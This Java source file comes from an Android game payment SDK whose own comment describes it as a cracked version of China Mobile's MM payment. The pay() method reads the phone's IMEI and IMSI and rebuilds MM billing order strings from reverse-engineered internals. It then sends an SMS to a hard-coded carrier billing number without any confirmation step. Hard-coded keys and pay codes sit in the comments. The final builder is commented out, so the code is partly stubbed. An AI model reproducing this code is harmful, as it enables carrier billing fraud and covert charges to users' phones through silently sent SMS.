package mobi.zty.pay.sdk.mmFee;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.pay.sdk.ShopInfo;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.SendOder;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

import com.iap.demo.weiying.MMPayUtil;
import com.iap.demo.weiying.ztya;

/**
 * mm的破解支付和依赖与mm正常支付的包 （刚开始没考虑到这个问题）
 * @author Administrator
 *
 */
public class MMFeeInstance extends PaymentInterf {
	private static MMFeeInstance instance;
	private Handler callBHandler = null;
	private ShopInfo shopInfo = null;
	public static MMFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized MMFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new MMFeeInstance();
		}
		return instance;
	}
	
	@Override
	public void init(Context context, Object... parameters) {
		String appID = (String)parameters[0];
		shopInfo = PayConfig.getShopInfo(appID,PayConfig.CMCC_NETIVE_FEE);
		callBHandler = (Handler) parameters[1];
	}
	@Override
	public void pay(Context context, Object... parameters) {
		String ret;
		if (shopInfo==null) {
			PayResultInfo info = new PayResultInfo();
			info.resutCode = PayConfig.MM_INIT_FAIL;
			info.retMsg = "gameId不存在";
			Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
			message.obj = info;
			message.sendToTarget();
		}
		int index = (Integer) parameters[1];
		 //MMPayUtil.adfdf(this.activity);
	   	ret = getOrderContent((Activity)context,index);//MMPayUtil.getstrcontent("30000745050811", "124665");
	   	String num ="1065842410";
	   	//Util_G.sendTextMessage(activity, num, ret, null);	
	   	Util_G.debug_e(Util_G.busylog, ret); 
	   	
	   	Intent itSend = new Intent(GameSDK.SENT_SMS_ACTION);  
       //itSend.putExtra(KEY_PHONENUM, contactList.get(i));  
       PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。         
		Util_G.sendTextMessage(context, num, ret, mSendPI,0);
	}
	
	 private String getOrderContent(Activity activity,int index)
	  {
	   	// encode(865009026264361L);
	   	   String ret = "";
	       String gt = "";//ztya.gt();//"2ETI2R";//时间a5lLhk/aefg=
	       //YL4sZqsLRW8=
	       String ProgramId =  MMPayUtil.getProgramId(Helper.getChannel(activity, "ProgramId"));//MMPayUtil.getProgramId("lToRlQI6Wss=");//"1NJCHR";//程序ID,mmiap.xml，cYxmgT8D3GQ=//雷电
	       String channel = Helper.getChannel(activity,"channel");//"0";//渠道ID
	       if(StringUtil.isEmpty(channel))
	        {
	        	channel = "0000000000";
	        }
	       //190
	       String payCode = shopInfo.payCodeMap.get(index);//"30000867338108";//"30000851678201";//SMSPurchase.encode(MMPayUtil.parseLong(LEASE_PAYCODE));//"AMU5H0917";//计费代码
	       String AppKey = shopInfo.AppKey;//"F1A2C419E41C1DDB";//"A3247E0A5B4FCC46";//APPKEY
			
	       String url = GameSDK.getSetting(activity, Constants.MKUrl);
	       if(url.length() > 0)
	       {
	     	  String splitstr=url;
	   		  String[] strarray=splitstr.split(";");//;AUWYuAKbpU0=;30000870223011;54A8215239F9968665EF090054BAB175;2200130531   		
	   		  gt = strarray[0];
	   		  
	   		  if(!StringUtil.isEmpty(strarray[1]))
	   		  {
					ProgramId = MMPayUtil.getProgramId(strarray[1]);
	   		  }
	   		
	   		  //ProgramId = MMPayUtil.getProgramId(strarray[1]);//app_ext1
	   		  if(!StringUtil.isEmpty(strarray[2]))
	   		  {
	   		      payCode = strarray[2];
	   		  }
	   		  if(!StringUtil.isEmpty(strarray[3]))
	   		  {
	   			 AppKey = strarray[3];
	   		  }
	   		  //AppKey = strarray[3];
	   		 if(!StringUtil.isEmpty(strarray[4]))
	  		  {
	   			channel = strarray[4];
	  		  }
	       }
	       
	       String imei = Helper.getIMEI(activity);//SMSPurchase.encode(MMPayUtil.parseLong(IMEI));//"8IMBNSD73D";//lsl,IMEI
	       String imsi = Helper.getIMSI(activity);//SMSPurchase.encode(MMPayUtil.parseLong(getIMSI(this)));//"4J2EGWX8DW";//lsl,Imsi
	   	    
	       String key =Util_G.getKey(activity);
	       //"ac9c536b357e1df7cb4f06a631c005068ba73dcb0eb65c689aff21893a8244f87d7c985c91244eb6ba4b9b31a881c475c3d422b30a408483a87936e4661a074847204e5a8699578c4fec6ba4688ebb9b16507f608dd4bdf4dac826ec560026297c2b60859ca912b0ec513290edaf0a5330c94709ec7dc55bbb4c7c08fe6c23b3bf052913adeb2cadc9a9739020fb0d23a508db23f5dcc963e50045ae5a1f3d5f02b3f77975f4a99c31fc3f341d1e09acd21640ec6f0aeacf2c6b1d1e632b09ab314294749485e18dbbed65a5e4c8a6a41bd284103054242ddbd6acc675162f7f2d0c7ea038445807d280a97518e5ff090c54855e72e399dc5dff8e262a3afff7";//lsl,用户数据
	       // c1af7905db82645b2e03273cbcebde3b3375ba92fa5c7ba8bb1ef7bc3ca2ecbff23f0cee2776c4754ab708ba110454aff95b6eb3602620ac2943ba7831c0d29666e9ac3195d7ac684b7599435c2216c5cc26509ceb55ea8676a6070b6722c63998f2e326ca92018597dcc78367523a059a2d5a3c129850df2ddc8966b0eb0207
	       String userData = imei;//"123456";//lsl,用户数据/要求packet_id->imei
	       //a2#1NJCHR#0#4J2EGWX8DW#8IMBNSD73D#2ETI2R#AMU5H0917#F940D3A6F910E27E#3408C325AD09F1C4#A7F51866AB30C1FD#test
	        //a2#1LQWK#0#4J2EGWX8DW#8IMBNSD73D#2ETI2R#AMU5H0917#106B2F53B53D2E97#A2EC9438BB400CDB#9C25194AAC32FA4B#test
	       // a2#1LQWK#0#31Z7H5BO5C#8IMBNSD73D#2FK8XQ#AMU5H0917#7EC3BA7F87B2C348#65EAE460A975AA12#F199B5C9CE397F2E#test
	       // a2#1LQWK#0#31Z7H5BO5C#8IMBNSD73D#2FK946#AMU5H0917#14222B27ED988D04#BB7697371E672CB0#2EBF9E5A462D486F#123456789012345
	       //String str5 = "";//MMPayUtil.gen_order_id(str1,str2,str3,str4,str7,str8,str6);//"F940D3A6F910E27E";//lsl,计费代码

	     	
	       //String str11 = IdentifyApp.SMSOrderContent(str1, str2, str3, str4, str5,str6, str7, str8, str9, str10);
	       //String str11 = MMPayUtil.getOrderContent(str1, str2, str3, str4, str5, str6, str7, str8, str9, str10);
	      // ret = getstrcontent(ProgramId,AppKey,key,channle
	       //		,payCode, imei, imsi,userData,"fdsf","fdsf");
	       
	       ret = getOrderContent(gt,ProgramId,AppKey,key,channel
	       		,payCode, imei, imsi,userData);
	       return ret;
	    }
	 public   String getOrderContent(String gt,
	    		String programId,String AppKey
	    		,String key,String channle,String payCode
	    		,String IMEI,String IMSI,
	    		String userData)
	     {
	          String ret = "";
	          
	          String str1 = ztya.gt();//"2ETI2R";//时间
	          if(!StringUtil.isEmpty(gt))
	          {
	        	  str1 = gt;
	          }
	          String str2 = ztya.en(MMPayUtil.parseLong(programId));//"1LQWK";//"1NJCHR";//程序ID
	          
	          String str3 =  ztya.en(MMPayUtil.parseLong(channle));//"0";//渠道ID
	          String str4 = ztya.en(MMPayUtil.parseLong(payCode));//"AMU5H0917";//计费代码

	          String str6 = AppKey;//"A3247E0A5B4FCC46";//APPKEY
	          String str7 =ztya.en(MMPayUtil.parseLong(IMEI));//"8IMBNSD73D";//lsl,IMEI
	          String str8 =ztya.en(MMPayUtil.parseLong(IMSI));//"4J2EGWX8DW";//lsl,Imsi
	      	    
	          String str9 =key;//"ac9c536b357e1df7cb4f06a631c005068ba73dcb0eb65c689aff21893a8244f87d7c985c91244eb6ba4b9b31a881c475c3d422b30a408483a87936e4661a074847204e5a8699578c4fec6ba4688ebb9b16507f608dd4bdf4dac826ec560026297c2b60859ca912b0ec513290edaf0a5330c94709ec7dc55bbb4c7c08fe6c23b3bf052913adeb2cadc9a9739020fb0d23a508db23f5dcc963e50045ae5a1f3d5f02b3f77975f4a99c31fc3f341d1e09acd21640ec6f0aeacf2c6b1d1e632b09ab314294749485e18dbbed65a5e4c8a6a41bd284103054242ddbd6acc675162f7f2d0c7ea038445807d280a97518e5ff090c54855e72e399dc5dff8e262a3afff7";//lsl,用户数据
	          String str10 =userData;//"test";//lsl,用户数据
	          String str5 = "";//MMPayUtil.gen_order_id(str1,str2,str3,str4,str7,str8,str6);//"F940D3A6F910E27E";//lsl,计费代码

	          ret = getOrderContent(str1, str2, str3, str4, str5, str6, str7, str8, str9, str10);
	          //ret = MMPayUtil.getstrcontent(str1, str2, str3, str4, str5, str6, str7, str8, str9, str10);
	          //MMPayUtil tPay = new MMPayUtil();
	          //Util_G.debug_e(Util_G.busylog, tPay.getstr("hello"));
	          return ret;
	     }
	 	public String getOrderContent(String str1,String str2,String str3
				,String str4,String str5,String str6,String str7,
				String str8,String str9,String str10)
		 {
		    str5 =MMPayUtil.gen_order_id(str1,str2,str3,str4,str7,str8,str6);//"F940D3A6F910E27E";//lsl,计费代码

		    SendOder.getInstance().sapay_ret(str5,0); 
		    String str11 = "";//mm1.23sdk
//		    String str11 = IdentifyApp.SMSOrderContent(str1, str2, str3, str4, str5,str6, str7, str8, str9, str10);
		    Util_G.debug_e(Util_G.busylog, "content:"+str11);
		    return str11;
		 }
}
